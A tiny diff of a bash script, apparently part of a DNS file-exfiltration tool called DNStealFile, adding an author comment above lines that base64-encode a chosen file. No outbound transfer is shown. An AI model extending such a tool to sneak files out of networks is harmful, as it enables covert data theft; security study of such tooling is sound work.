@@ -1,4 +1,5 @@
 #!/bin/bash
+#by @lobuhisec
 mkdir DNStealFile
 echo $1
 cat $1 | base64 > DNStealFile/file.b64
